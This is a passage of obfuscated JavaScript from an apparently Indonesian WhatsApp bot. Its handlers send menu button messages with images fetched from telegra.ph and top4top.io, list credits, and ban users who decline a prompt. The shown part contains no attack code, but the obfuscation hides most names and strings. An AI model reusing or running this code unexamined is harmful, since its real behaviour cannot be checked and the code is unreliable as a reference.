_0x37a78d={};_0x37a78d[_0x15af3d(0x6ec,0x9eb,0x9a8,0x8ef)+'t']=_0x134458(0x9ea,0x76b,0xd41,0x6d8);const _0x53e83a={};_0x53e83a[_0x15af3d(0xc33,0xd51,0xa5b,0xa83)]=_0x15af3d(0x413,0x3d6,0x432,0x421),_0x53e83a[_0x15af3d(0x5a7,0x9e2,0x34b,0x5eb)]=_0x37a78d,_0x53e83a[_0x134458(0x8ff,0xca9,0x793,0x6f1)]=0x1,sendButLocation(from,photooxymenu(prefix),''+tampilTanggal+enter+tampilWaktu+enter+enter+_0x15af3d(0xb3b,0x894,0xa64,0x688)+ini_mark['split']('@')[-0x14e3+-0x88*-0xc+0xe83],pdkdk,[_0x4667ed,_0x53e83a],{'contextInfo':{'mentionedJid':[ini_mark]}}),await limitAdd(sender,limit);}if(sub_yt_zeeone_ofc=='othermenu'){console[_0x134458(0xa47,0xabd,0xd38,0x9a5)](color(time,_0x134458(0x64d,0x85a,0x831,0x15b)),color(_0x15af3d(0x41f,-0x8a,0x9c,-0x11)+_0x15af3d(0x5e8,0x665,0x8fa,0x319)+'nu'));var othendjke=await getBuffer('https://te'+_0x15af3d(0x88d,0x85e,0xcd6,0xd73)+_0x134458(0x24b,0x56b,0x1a5,0x726)+'d89eeaefc6'+_0x134458(0x47f,0x3b0,0x299,0x701));const _0x2c8ad2={};_0x2c8ad2['displayTex'+'t']=_0x134458(0x905,0xc62,0xd60,0x76e);const _0x281df5={};_0x281df5[_0x15af3d(0xc33,0xd28,0xf49,0x94b)]=_0x134458(0x501,0x451,0x73d,0x35e),_0x281df5[_0x15af3d(0x5a7,0xa5f,0x1c8,0x473)]=_0x2c8ad2,_0x281df5[_0x134458(0x8ff,0x489,0xcba,0xde1)]=0x1;const _0x595798={};_0x595798[_0x15af3d(0x6ec,0x770,0xab1,0x96c)+'t']=_0x134458(0x9ea,0x818,0xd10,0x81b);const _0x3662f7={};_0x3662f7[_0x15af3d(0xc33,0xbd6,0x93c,0x7a9)]=_0x15af3d(0x413,0x62f,0x297,0x15e),_0x3662f7['buttonText']=_0x595798,_0x3662f7[_0x15af3d(0xa52,0xbe0,0xf2f,0x5bc)]=0x1,sendButLocation(from,othermenu(prefix),''+tampilTanggal+enter+tampilWaktu+enter+enter+_0x15af3d(0xb3b,0xc78,0x7d9,0xe08)+ini_mark[_0x15af3d(0x53f,0x2a8,0x33f,0x91)]('@')[-0x1d6d+0xa73+0x12fa*0x1],othendjke,[_0x281df5,_0x3662f7],{'contextInfo':{'mentionedJid':[ini_mark]}}),await limitAdd(sender,limit);}if(sub_yt_zeeone_ofc==_0x134458(0x334,0x42b,0x2f3,0x1d2)){console[_0x15af3d(0xb9a,0xa35,0xf8f,0xd9d)](color(time,_0x15af3d(0x7a0,0xa72,0x959,0x731)),color(_0x15af3d(0x41f,0x46,0x29d,0x21b)+_0x134458(0x7db,0x61b,0x9c9,0xbfd)+'nu'));var ownermenjdu=await getBuffer(_0x15af3d(0x607,0x81b,0x7de,0xa84)+'legra.ph/f'+'ile/9fc9b3'+'d6da00d7ae'+_0x15af3d(0xbae,0xe68,0xc2c,0x9c7));const _0x3e56c0={};_0x3e56c0[_0x15af3d(0x6ec,0x505,0x6f8,0x9cd)+'t']=_0x15af3d(0xa58,0x9bb,0x805,0x84a);const _0x722be4={};_0x722be4['buttonId']=_0x15af3d(0x654,0x20f,0x72e,0x851),_0x722be4[_0x15af3d(0x5a7,0x43c,0x6cc,0x463)]=_0x3e56c0,_0x722be4['type']=0x1;const _0x5e3f06={};_0x5e3f06[_0x15af3d(0x6ec,0x7e9,0xba5,0x49e)+'t']=_0x134458(0x9ea,0xb6d,0xebf,0x666);const _0x23468c={};_0x23468c[_0x134458(0xae0,0xf13,0x7ae,0xacf)]=_0x15af3d(0x413,0x1a8,0x70f,0x730),_0x23468c[_0x134458(0x454,0x31,0x516,0x65b)]=_0x5e3f06,_0x23468c['type']=0x1,sendButLocation(from,ownermenu(prefix),''+tampilTanggal+enter+tampilWaktu+enter+enter+_0x15af3d(0xb3b,0xaf1,0x697,0x67e)+ini_mark[_0x15af3d(0x53f,0x98c,0x822,0x10e)]('@')[-0xc*-0x207+0x1886+-0x30da],ownermenjdu,[_0x722be4,_0x23468c],{'contextInfo':{'mentionedJid':[ini_mark]}}),await limitAdd(sender,limit);}if(sub_yt_zeeone_ofc==_0x15af3d(0x3df,0x814,0x750,0x476)+'u'){console[_0x134458(0xa47,0xbf7,0xf19,0xde5)](color(time,_0x134458(0x64d,0x8fc,0x46a,0xa55)),color(_0x15af3d(0x41f,0x2a0,0x199,0x5fd)+_0x134458(0x23f,0x4eb,0x714,0x574)+_0x15af3d(0x845,0x7cc,0xc49,0x545)));var storagemsn=await getBuffer('https://te'+_0x134458(0x73a,0x5aa,0x680,0x3a9)+'ile/4c2e47'+_0x134458(0x45b,0x30b,0x25d,0x396)+_0x15af3d(0x47e,0x827,0x4a9,0x805));const _0x1d728a={};_0x1d728a[_0x134458(0x599,0x478,0x45b,0x174)+'t']=_0x15af3d(0xa58,0x926,0xc5d,0xd96);const _0x51695a={};_0x51695a[_0x15af3d(0xc33,0xbba,0xe22,0xf9a)]=_0x15af3d(0x654,0x970,0xa30,0x618),_0x51695a[_0x15af3d(0x5a7,0x252,0x992,0x62e)]=_0x1d728a,_0x51695a[_0x134458(0x8ff,0x91c,0x860,0x955)]=0x1;const _0x4e58a5={};_0x4e58a5[_0x15af3d(0x6ec,0xabd,0xb89,0x8b3)+'t']=_0x15af3d(0xb3d,0x970,0xf38,0xfa3);const _0x59057a={};_0x59057a[_0x15af3d(0xc33,0xa70,0x97d,0xdc4)]='owner',_0x59057a[_0x15af3d(0x5a7,0x782,0x69c,0xa27)]=_0x4e58a5,_0x59057a[_0x15af3d(0xa52,0x965,0xbf8,0xd52)]=0x1,sendButLocation(from,storagemenu(prefix),''+tampilTanggal+enter+tampilWaktu+enter+enter+'Regard\x20@'+ini_mark[_0x134458(0x3ec,0x6c0,0x40f,0x10a)]('@')[-0x207c+-0x5f*0x4a+0x2*0x1df9],storagemsn,[_0x51695a,_0x59057a],{'contextInfo':{'mentionedJid':[ini_mark]}}),await limitAdd(sender,limit);}if(sub_yt_zeeone_ofc=='tagmenu'){console[_0x134458(0xa47,0xc21,0xa2e,0x643)](color(time,_0x134458(0x64d,0x71b,0x49f,0xb11)),color(_0x134458(0x2cc,-0x1c4,-0x172,-0xbe)+_0x15af3d(0x2f1,0x187,-0xc6,-0x18b)));var tagmwnjn=await getBuffer(_0x134458(0x4b4,0x84e,0x950,0x6dc)+'legra.ph/f'+_0x15af3d(0xba5,0xdf8,0xc23,0xfb7)+_0x15af3d(0xc70,0xfa6,0xc2c,0xab4)+_0x15af3d(0x871,0x80c,0x95b,0x3c9));const _0x270029={};_0x270029[_0x15af3d(0x6ec,0x203,0xa80,0xaff)+'t']=_0x134458(0x905,0x6b3,0x6ff,0x881);const _0xf42f50={};_0xf42f50[_0x15af3d(0xc33,0xabe,0xe2f,0x8b0)]=_0x15af3d(0x654,0x740,0x3f7,0x6b5),_0xf42f50[_0x134458(0x454,-0x8,0x6dc,0x41b)]=_0x270029,_0xf42f50[_0x15af3d(0xa52,0xa91,0xdbc,0xe6e)]=0x1;const _0x58fd42={};_0x58fd42[_0x134458(0x599,0x662,0x636,0x309)+'t']=_0x15af3d(0xb3d,0xbd7,0xef0,0xbe3);const _0x53eb89={};_0x53eb89[_0x15af3d(0xc33,0x7ba,0xa4f,0x75c)]=_0x134458(0x2c0,0x4b5,-0x42,0x6c5),_0x53eb89[_0x134458(0x454,0x3ab,0x476,0x6f3)]=_0x58fd42,_0x53eb89['type']=0x1,sendButLocation(from,tagmenu(prefix),''+tampilTanggal+enter+tampilWaktu+enter+enter+_0x134458(0x9e8,0xb64,0xa8d,0x589)+ini_mark[_0x134458(0x3ec,0xa8,0x67a,0x1d6)]('@')[0x1*0x169f+0x1032+-0x20b*0x13],tagmwnjn,[_0xf42f50,_0x53eb89],{'contextInfo':{'mentionedJid':[ini_mark]}}),await limitAdd(sender,limit);}if(sub_yt_zeeone_ofc==_0x134458(0x277,0x4f3,0xe6,0x37d)){console[_0x15af3d(0xb9a,0x761,0x9f9,0xd73)](color(time,_0x15af3d(0x7a0,0x508,0x5bb,0x7ba)),color('List\x20messa'+_0x15af3d(0x459,0x588,0x56d,0x12a)));var upmenuj=await getBuffer(_0x134458(0x4b4,-0x1,0xdd,0x6c)+_0x15af3d(0x88d,0x647,0xaa1,0x96f)+_0x134458(0x5dc,0x351,0x15a,0x662)+_0x134458(0x78f,0x981,0xaf8,0x331)+_0x134458(0x239,0x6c4,0x2da,-0x261));const _0x3225d8={};_0x3225d8[_0x134458(0x599,0x520,0xbd,0x1a3)+'t']='⋮☰\x20BACK';const _0x53ffcd={};_0x53ffcd[_0x15af3d(0xc33,0xe63,0xf94,0xf60)]='Command',_0x53ffcd[_0x15af3d(0x5a7,0xa3e,0x645,0x85b)]=_0x3225d8,_0x53ffcd[_0x134458(0x8ff,0xc0c,0x566,0xc9e)]=0x1;const _0x439a16={};_0x439a16['displayTex'+'t']=_0x134458(0x9ea,0xad3,0xe3e,0xb0e);const _0x1fe918={};_0x1fe918[_0x134458(0xae0,0xc7e,0xcc1,0xa17)]=_0x15af3d(0x413,0x125,-0x9d,0x7d9),_0x1fe918[_0x15af3d(0x5a7,0xc7,0x1d3,0x7ee)]=_0x439a16,_0x1fe918[_0x134458(0x8ff,0xc27,0x4bf,0x502)]=0x1,sendButLocation(from,upmenu(prefix),''+tampilTanggal+enter+tampilWaktu+enter+enter+_0x134458(0x9e8,0xc1e,0x7ea,0x90c)+ini_mark[_0x134458(0x3ec,0x55c,0x259,0x4c5)]('@')[-0x1bb*-0x7+-0x265*0x3+0x277*-0x2],upmenuj,[_0x53ffcd,_0x1fe918],{'contextInfo':{'mentionedJid':[ini_mark]}}),await limitAdd(sender,limit);}if(sub_yt_zeeone_ofc=='gacha\x20ceca'+'n'){console[_0x15af3d(0xb9a,0x929,0xd66,0xf6a)](color(time,_0x15af3d(0x7a0,0xc33,0x7e4,0x3f8)),color(_0x15af3d(0x41f,0x88d,0x888,0x302)+_0x134458(0x34b,-0x16d,0x7a9,-0x1a1)+_0x134458(0x4a1,0x948,0x216,0x23a)));var cecanksk=await getBuffer(_0x15af3d(0x607,0x16c,0x467,0x872)+_0x134458(0x73a,0x268,0x319,0xae7)+'ile/6de20d'+_0x15af3d(0x8c4,0xa08,0x632,0x42f)+'a4e88.jpg');const _0x52658e={};_0x52658e[_0x134458(0x599,0x2f1,0x528,0x9d5)+'t']='⋮☰\x20BACK';const _0x14d7cb={};_0x14d7cb[_0x134458(0xae0,0x845,0xcf7,0x76f)]=_0x134458(0x501,0x2ef,0x266,0x626),_0x14d7cb[_0x15af3d(0x5a7,0x4f8,0x327,0x9da)]=_0x52658e,_0x14d7cb[_0x15af3d(0xa52,0x90c,0xb57,0x99d)]=0x1;const _0x2224ef={};_0x2224ef[_0x15af3d(0x6ec,0x4a6,0x521,0x9f5)+'t']=_0x15af3d(0xb3d,0x68f,0x712,0xf8a);const _0x513e81={};_0x513e81[_0x134458(0xae0,0xc56,0x900,0x8be)]=_0x15af3d(0x413,0x825,0x162,0x2d1),_0x513e81[_0x15af3d(0x5a7,0x8a8,0x9b9,0x2fc)]=_0x2224ef,_0x513e81[_0x134458(0x8ff,0xa92,0x7f2,0xa40)]=0x1,sendButLocation(from,cecanmenu(prefix),''+tampilTanggal+enter+tampilWaktu+enter+enter+_0x15af3d(0xb3b,0xac4,0x925,0xacc)+ini_mark[_0x15af3d(0x53f,0x787,0x7b8,0x3cd)]('@')[-0x829+-0x2*0x1a1+0x4f*0x25],cecanksk,[_0x14d7cb,_0x513e81],{'contextInfo':{'mentionedJid':[ini_mark]}}),await limitAdd(sender,limit);}if(sub_yt_zeeone_ofc==_0x15af3d(0x2ed,0x13,0x663,-0x5b)+'n'){console['log']('\x1b[1;31m~\x1b['+'1;37m>',_0x15af3d(0x61b,0x7f2,0x4be,0x3cb)+_0x15af3d(0x551,0x7a7,0x45b,0x239)+']',wib,color(_0x134458(0x716,0x979,0x67e,0x3c2)+_0x15af3d(0x49e,0x498,0x24e,0x7e4)+_0x15af3d(0x5c3,0x12a,0x3a1,0x860)));var coganksk=await getBuffer(_0x134458(0x4b4,0x2e3,0x791,0x5bf)+_0x15af3d(0x88d,0xa40,0x71b,0x7c3)+_0x15af3d(0x669,0xa6a,0x48b,0x76d)+_0x134458(0x1db,0x548,0x3f3,0x253)+_0x15af3d(0x612,0x702,0x430,0x857));const _0x312a51={};_0x312a51[_0x15af3d(0x6ec,0x313,0x82f,0x49c)+'t']=_0x15af3d(0xa58,0xaff,0xbec,0x8aa);const _0x20e4ce={};_0x20e4ce[_0x15af3d(0xc33,0xf03,0xb2a,0xfa7)]='Command',_0x20e4ce[_0x15af3d(0x5a7,0x820,0xbc,0x425)]=_0x312a51,_0x20e4ce[_0x134458(0x8ff,0xb72,0x489,0x929)]=0x1;const _0x421c0a={};_0x421c0a[_0x15af3d(0x6ec,0x6c2,0xbbe,0xb69)+'t']='✓\x20OWNER';const _0x3736ec={};_0x3736ec[_0x134458(0xae0,0xc86,0xb66,0x613)]='owner',_0x3736ec[_0x134458(0x454,0x483,0x77e,0x252)]=_0x421c0a,_0x3736ec[_0x15af3d(0xa52,0x55d,0x687,0x7f8)]=0x1,sendButLocation(from,coganmenu(prefix),''+tampilTanggal+enter+tampilWaktu+enter+enter+_0x15af3d(0xb3b,0xeac,0xc74,0x657)+ini_mark['split']('@')[-0x10e*-0x1+-0x1a01+0x18f3],coganksk,[_0x20e4ce,_0x3736ec],{'contextInfo':{'mentionedJid':[ini_mark]}}),await limitAdd(sender,limit);}function _0x15af3d(_0x447adf,_0x445a5e,_0x3cd4f3,_0x2e30bb){return _0x4ca6(_0x447adf-0x13c,_0x3cd4f3);}if(sub_yt_zeeone_ofc=='telegram\x20s'+_0x15af3d(0x4d1,0x984,0x8a1,0x517)){console['log'](color(time,'magenta'),color(_0x15af3d(0x41f,0x861,0x204,0xe8)+_0x15af3d(0x4ef,0x53c,0x47a,0xf4)+_0x134458(0x431,0x1f1,0x286,0x70)));var telesjtje=await getBuffer(_0x134458(0x4b4,0x5c3,0xaa,0x3bd)+_0x134458(0x73a,0x9fb,0x72d,0x26a)+_0x134458(0x159,-0x13e,-0x7a,0x3a8)+'8a682c0e76'+_0x134458(0x97d,0x856,0xd7e,0x94e));const _0x47b10b={};_0x47b10b[_0x134458(0x599,0x579,0x165,0x777)+'t']=_0x134458(0x905,0xbc6,0x72c,0xbc4);const _0x38ec00={};_0x38ec00['buttonId']='Command',_0x38ec00['buttonText']=_0x47b10b,_0x38ec00[_0x15af3d(0xa52,0xb2a,0xb2b,0x973)]=0x1;const _0x28f148={};_0x28f148[_0x15af3d(0x6ec,0x5c0,0xaad,0x56d)+'t']=_0x15af3d(0xb3d,0xd9b,0x86e,0xfe8);const _0x18bb31={};_0x18bb31[_0x134458(0xae0,0xa73,0xb4a,0x6e6)]='owner',_0x18bb31[_0x15af3d(0x5a7,0x218,0x692,0x1a8)]=_0x28f148,_0x18bb31[_0x15af3d(0xa52,0x590,0x9cf,0x9ee)]=0x1,sendButLocation(from,telestiker(prefix),''+tampilTanggal+enter+tampilWaktu+enter+enter+'Regard\x20@'+ini_mark[_0x15af3d(0x53f,0x5f8,0x4fc,0x41e)]('@')[0xa85+0xbd1+0xb2b*-0x2],telesjtje,[_0x38ec00,_0x18bb31],{'contextInfo':{'mentionedJid':[ini_mark]}}),await limitAdd(sender,limit);}if(sub_yt_zeeone_ofc==_0x134458(0xae6,0xc58,0xca3,0xe38)+'ct'){console[_0x134458(0xa47,0x7b4,0xca6,0x6ee)](color(time,'magenta'),color(_0x134458(0x2cc,0x2e0,-0xf1,-0xdb)+'ge\x20image\x20e'+_0x134458(0x161,0x229,0x227,0x227)));var imagekskwo=await getBuffer(_0x134458(0x4b4,0x5e8,0x598,0x320)+'legra.ph/f'+_0x134458(0x190,0x24f,-0x284,0x660)+_0x134458(0x970,0xd49,0x55e,0x7b5)+_0x134458(0x603,0x1f1,0x362,0x59f));const _0x516c23={};_0x516c23[_0x15af3d(0x6ec,0x804,0x800,0x478)+'t']='⋮☰\x20BACK';const _0xe69732={};_0xe69732[_0x134458(0xae0,0xbb7,0xee6,0xf13)]='Command',_0xe69732[_0x15af3d(0x5a7,0x61e,0x588,0x846)]=_0x516c23,_0xe69732[_0x15af3d(0xa52,0x9e7,0xd02,0xd71)]=0x1;const _0x1fd99a={};_0x1fd99a['displayTex'+'t']=_0x134458(0x9ea,0x6a3,0xcd0,0xe96);const _0x553429={};_0x553429[_0x134458(0xae0,0xe92,0x5ed,0xda4)]=_0x15af3d(0x413,0x5fa,0x356,0x628),_0x553429[_0x15af3d(0x5a7,0x495,0x8e9,0x69a)]=_0x1fd99a,_0x553429['type']=0x1,sendButLocation(from,image_effect(prefix),''+tampilTanggal+enter+tampilWaktu+enter+enter+_0x15af3d(0xb3b,0x885,0xe4e,0x1011)+ini_mark[_0x134458(0x3ec,0x74b,0x388,-0xf5)]('@')[0xd13*-0x1+0x3b*0x11+0x4*0x24a],imagekskwo,[_0xe69732,_0x553429],{'contextInfo':{'mentionedJid':[ini_mark]}}),await limitAdd(sender,limit);}if(sub_yt_zeeone_ofc==_0x134458(0x99b,0x7fb,0xcd9,0x5c6)+'e'){console[_0x134458(0xa47,0x59d,0xb87,0xcd3)](color(time,_0x15af3d(0x7a0,0x8d5,0x7ae,0x8cc)),color(_0x15af3d(0x41f,0x1fa,-0x89,0x788)+_0x134458(0x59b,0xa7,0x18a,0x51a)+_0x15af3d(0xc30,0xd01,0xeb5,0x749)));var sourbwbbz=await getBuffer(_0x15af3d(0x607,0x3a1,0xa77,0xa5c)+'legra.ph/f'+_0x134458(0x491,0x1fb,0x938,0x6ba)+_0x15af3d(0x8ed,0xcd3,0xbca,0xc9d)+_0x15af3d(0x70a,0xb32,0xa5d,0x378));const _0x18b9e0={};_0x18b9e0[_0x134458(0x599,0x975,0x6dd,0x2a2)+'t']=_0x15af3d(0x760,0x6a7,0x5b2,0x871);const _0x1d8c18={};_0x1d8c18[_0x134458(0xae0,0x762,0xfa8,0x8b6)]='Command',_0x1d8c18['buttonText']=_0x18b9e0,_0x1d8c18[_0x15af3d(0xa52,0x687,0xa93,0x582)]=0x1;const _0x121918={};_0x121918[_0x134458(0x599,0x8db,0x2f6,0x507)+'t']=_0x134458(0x9ea,0x80c,0xbf2,0xe9f);const _0x2cea65={};_0x2cea65[_0x134458(0xae0,0xc2f,0x7eb,0xdec)]=_0x134458(0x2c0,0x114,0x1ff,-0x1c3),_0x2cea65['buttonText']=_0x121918,_0x2cea65[_0x134458(0x8ff,0x89b,0x641,0xd9d)]=0x1,sendButLocation(from,_0x15af3d(0x4cb,0x980,0x964,0x2cc)+_0x15af3d(0x3b6,0x67e,0x548,0x1b8)+':\x20https://'+_0x134458(0x8ac,0x855,0xd5f,0xcf0)+_0x15af3d(0x4e0,0x6b4,0x8cd,0x19b)+_0x134458(0x607,0x648,0x11d,0x483),''+tampilTanggal+enter+tampilWaktu+enter+enter+_0x15af3d(0xb3b,0xa2c,0x1019,0xcc6)+ini_mark['split']('@')[-0x1fa8+0x1775+-0x833*-0x1],sourbwbbz,[_0x1d8c18,_0x2cea65],{'contextInfo':{'mentionedJid':[ini_mark]}}),await limitAdd(sender,limit);}if(sub_yt_zeeone_ofc==_0x134458(0x4d6,0x412,0x818,0x70f)+_0x15af3d(0x9e0,0x851,0x894,0x573)){const ngOUtg=_0x134458(0x9df,0x9da,0xb3a,0xcd2)[_0x15af3d(0x53f,0x81,0x8d4,0x38d)]('|');let dgToyc=-0x1096+-0x2*-0xd71+-0xa4c;while(!![]){switch(ngOUtg[dgToyc++]){case'0':const _0x122447={};_0x122447[_0x134458(0x502,0x556,0x6c8,0x155)]=''+ucapannya2,_0x122447['body']=_0x15af3d(0x9e9,0xd3e,0xad5,0x508)+_0x15af3d(0x6d2,0xa1c,0x9f9,0x24d),_0x122447[_0x134458(0x52a,0x707,0x4b6,0x6b1)+'e']=_0x15af3d(0x8ad,0x64c,0xd47,0x774),_0x122447['thumbnailU'+'rl']=''+imgUrl,_0x122447[_0x15af3d(0x606,0x2cc,0x29d,0x30e)]='',_0x122447[_0x15af3d(0x570,0xa26,0x23e,0x2c1)]=_0x134458(0xaec,0xa74,0x785,0x704)+'utube.com/'+_0x134458(0xb16,0xb1d,0x90f,0xff8)+_0x134458(0x888,0x4ec,0xc46,0x758)+_0x15af3d(0xa60,0x9cc,0xb22,0xba8)+'lA';const _0x49c613={};_0x49c613[_0x15af3d(0xb6e,0xfba,0x7d3,0xad1)]=_0x134458(0x1c8,-0x2a2,0x664,0x116),_0x49c613['forwarding'+_0x15af3d(0xc04,0xa6e,0x8f0,0xc19)]=0x3b9aca00,_0x49c613[_0x15af3d(0x588,0x2d6,0x366,0x84b)+'d']=!![],_0x49c613[_0x134458(0x4d7,0x22f,0x210,0x1e8)+_0x15af3d(0x5ca,0x15b,0x840,0x28a)]=!![],_0x49c613[_0x134458(0x581,0xb2,0x674,0x85f)+_0x134458(0x335,0x353,0x5a0,-0xd5)]=_0x122447;const _0x5b4613={};_0x5b4613['mentionedJ'+'id']=[ini_mark],alpha[_0x134458(0x982,0xdcc,0xb7c,0x66c)+'e'](from,tqto,text,{'thumbnail':fs['readFileSy'+'nc'](_0x15af3d(0x8c2,0x7f2,0x9ad,0x4bb)+thumbnail),'caption':_0x15af3d(0x31b,0x5a3,0x594,0x7e8),'contextInfo':_0x49c613,'quoted':ftoko,'contextInfo':_0x5b4613});continue;case'1':var imgList=[_0x134458(0x48f,0x719,0x58d,0x310)+'top4top.io'+'/p_2032o0l'+_0x15af3d(0x99f,0xc13,0xb18,0xdbf),_0x15af3d(0xc41,0xb7f,0x9ff,0xa72)+_0x15af3d(0x97b,0x8b3,0xc51,0x9bc)+_0x15af3d(0xaf5,0x647,0x8b7,0x769)+_0x134458(0x1d1,0x4e0,0x4f1,-0x86),_0x15af3d(0xad8,0x7d5,0x974,0xf20)+'top4top.io'+_0x134458(0x1cf,-0x38,0x183,0x129)+_0x15af3d(0x5ea,0x700,0x1a6,0x535),_0x134458(0x48f,0x31b,0x6ee,0x98)+'top4top.io'+'/p_2032xlj'+_0x134458(0x6ea,0x3bc,0x99c,0x46e),_0x15af3d(0x75e,0x827,0x3db,0x93b)+_0x15af3d(0x97b,0x979,0x511,0xb00)+_0x15af3d(0x2f4,-0x103,0x7b0,0x2f6)+_0x15af3d(0x6c5,0x3f1,0x1e1,0xaac),'https://d.'+'top4top.io'+_0x134458(0xa63,0xbba,0x9c7,0x667)+_0x15af3d(0xa4c,0x5e4,0x77a,0xda9),_0x15af3d(0x6d1,0x98c,0x4ca,0x799)+'top4top.io'+'/p_2032z7a'+_0x134458(0x720,0x533,0x6cf,0x6bc)];continue;case'2':var imgUrl=imgList[Math[_0x134458(0x989,0x547,0xaed,0x8b1)](Math[_0x134458(0x543,0x38f,0x896,0x1ff)]()*imgList[_0x15af3d(0x8be,0x7ed,0x5e4,0xb69)])];continue;case'3':console[_0x134458(0xa47,0xa7c,0x902,0x821)](color(time,_0x15af3d(0x7a0,0x613,0xa90,0x3cc)),color(_0x15af3d(0x41f,0x196,0x53d,0xb6)+'ge\x20Big\x20Tha'+_0x134458(0x7ac,0x48c,0x491,0x65d)));continue;case'4':tqto=_0x134458(0x915,0x91b,0x94f,0xb15)+_0x15af3d(0xc02,0xa67,0xa44,0x109e)+'VINZ\x0a•\x20MIS'+_0x134458(0x4c7,0x6c6,0x20,0x331)+_0x134458(0x7fa,0x581,0xcbf,0xc36)+'\x20\x0a•\x20FERDYZ'+_0x134458(0x46b,0x8f0,0x20f,0x54f)+_0x15af3d(0x55d,0x6a8,0x375,0x317)+ini_mark['split']('@')[-0x17f8+-0x7cf+0x1fc7];continue;}break;}}if(subscribezeeoneofc==_0x134458(0x7c5,0x7e2,0xadd,0x4e0)){const UVWBfa='2|3|1|0|4'['split']('|');let ecEcby=-0x19e8+-0x90b+-0x22f3*-0x1;while(!![]){switch(UVWBfa[ecEcby++]){case'0':const _0x263b18={};_0x263b18['contentTex'+'t']=ini_gopayyy,_0x263b18[_0x134458(0x9b2,0xa39,0x7ab,0x96b)]=''+tampilTanggal+enter+tampilWaktu+enter+enter+'©\x20'+creator,_0x263b18[_0x15af3d(0x474,0x7b7,0x271,0x6b4)]=buttonsss,_0x263b18['headerType']=0x1,buttonMessageee=_0x263b18;continue;case'1':const _0x5e234e={};_0x5e234e[_0x15af3d(0x6ec,0x4be,0xa76,0x744)+'t']='💞\x20Ya';const _0x2ee396={};_0x2ee396[_0x134458(0xae0,0xf74,0x81d,0x6f8)]=_0x15af3d(0xaeb,0x952,0xea2,0xdeb),_0x2ee396[_0x15af3d(0x5a7,0x8b6,0x21e,0x230)]=_0x5e234e,_0x2ee396[_0x15af3d(0xa52,0x80e,0xdd2,0xa34)]=0x1;const _0x5a1393={};_0x5a1393[_0x15af3d(0x6ec,0x6d1,0x69d,0xb76)+'t']=_0x15af3d(0x87e,0xb7d,0x830,0xb45);const _0x5b6041={};_0x5b6041[_0x134458(0xae0,0x7d9,0x611,0xc2d)]=_0x15af3d(0xb0c,0xec9,0xa42,0xf87),_0x5b6041[_0x15af3d(0x5a7,0xe7,0x25b,0x746)]=_0x5a1393,_0x5b6041[_0x134458(0x8ff,0x76e,0xd95,0x45f)]=0x1;var buttonsss=[_0x2ee396,_0x5b6041];continue;case'2':console[_0x15af3d(0xb9a,0xcea,0xa09,0xb40)](_0x134458(0x189,0x4e0,-0x277,0x5cb)+_0x134458(0x593,0x330,0xa62,0x7ba),_0x15af3d(0x61b,0x15d,0x16d,0x4c1)+'MD\x20\x1b[1;37m'+']',wib,color(_0x134458(0x8d8,0x717,0x71c,0x40a)+_0x15af3d(0xc66,0xb2c,0xb77,0xd50)+_0x15af3d(0xacb,0x92d,0x67d,0xe9b)));continue;case'3':var ini_gopayyy=_0x15af3d(0xa75,0x94a,0xd56,0x6f3)+sender[_0x15af3d(0x53f,0x156,0x787,0x509)]('@')[0x133c*0x1+-0x1418+0xdc]+(_0x15af3d(0x653,0x29a,0x322,0xb11)+_0x15af3d(0x9b7,0x805,0xcca,0x62a)+_0x15af3d(0xc64,0xac4,0x911,0x7d4)+'g\x20auto\x20ban'+_0x134458(0x76d,0xba7,0x9f5,0x30e));continue;case'4':const _0x3a58b5={};_0x3a58b5[_0x15af3d(0xb6e,0xec6,0x898,0x7ab)]='hi',_0x3a58b5[_0x15af3d(0x8f1,0xa76,0xae4,0xcad)+_0x15af3d(0xc04,0xbf0,0xaa3,0xa04)]=0x3b9aca00,_0x3a58b5['isForwarde'+'d']=!![],_0x3a58b5[_0x134458(0x4d7,0x551,0x99d,0x2fd)+'ral']=!![],_0x3a58b5[_0x15af3d(0x556,0x1c3,0x118,0x329)+'id']=[sender];const _0x315172={};_0x315172['caption']=_0x134458(0x4ea,0x271,0x60e,0x813)+'21',_0x315172[_0x15af3d(0xabb,0xde8,0xc22,0xe85)+'o']=_0x3a58b5,_0x315172['quoted']=mek,_0x315172['sendEpheme'+_0x134458(0x477,0x5df,0x3c7,0x196)]=!![],alpha['sendMessag'+'e'](from,buttonMessageee,MessageType[_0x134458(0x151,0x210,-0x136,0x4ec)+'sage'],_0x315172);continue;}break;}}subscribezeeoneofc==_0x134458(0x9b9,0xa34,0x9c8,0x55a)&&(console['log'](_0x15af3d(0x2dc,0x1fa,0x3af,0x517)+_0x134458(0x593,0x37d,0x91b,0x4c5),_0x15af3d(0x61b,0x726,0x89c,0x2bb)+'MD\x20\x1b[1;37m'+']',wib,color(_0x134458(0x8d8,0x95b,0x5bc,0x9d3)+'sage\x20Tidak')),reply('Hmm,\x20banne'+'d\x20aja\x20nih\x20'+_0x134458(0x3f6,0x79,0x445,0x33b)+_0x134458(0x4eb,0x9b,0x5b1,0x620)),bnnpd=sender['replace']('@','')+('@s.whatsap'+_0x134458(0x183,-0xab,-0x199,0xc2)),banned[_0x15af3d(0xbe3,0xf33,0x86a,0x70f)](bnnpd));if(subscribezeeoneofc=='ya_kak'){const mediaxpxa=await alpha[_0x134458(0xaa4,0xb31,0x690,0xed1)+_0x134458(0x9a3,0x74f,0xb4d,0xe05)](from,pp_bot,MessageType[_0x15af3d(0x683,0x6ae,0x910,0x324)],{'thumbnail':pp_bot});mhan=mediaxpxa[_0x15af3d(0x7cc,0x663,0x932,0x89a)]['ephemeralM'+'essage']?mediaxpxa[_0x15af3d(0x7cc,0x59b,0x4f1,0x3de)][_0x134458(0x7f8,0x523,0xa30,0xb7a)+_0x15af3d(0x99e,0x52f,0xe60,0x812)]:mediaxpxa;const _0x1896b8={};_0x1896b8[_0x15af3d(0x6ec,0x739,0x450,0x74a)+'t']=_0x15af3d(0xaea,0xd73,0x67b,0xf9f);const _0x589f80={};_0x589f80['buttonId']='sewa_1p',_0x589f80['buttonText']=_0x1896b8,_0x589f80[_0x15af3d(0xa52,0x624,0x58f,0xaf7)]=0x1;const 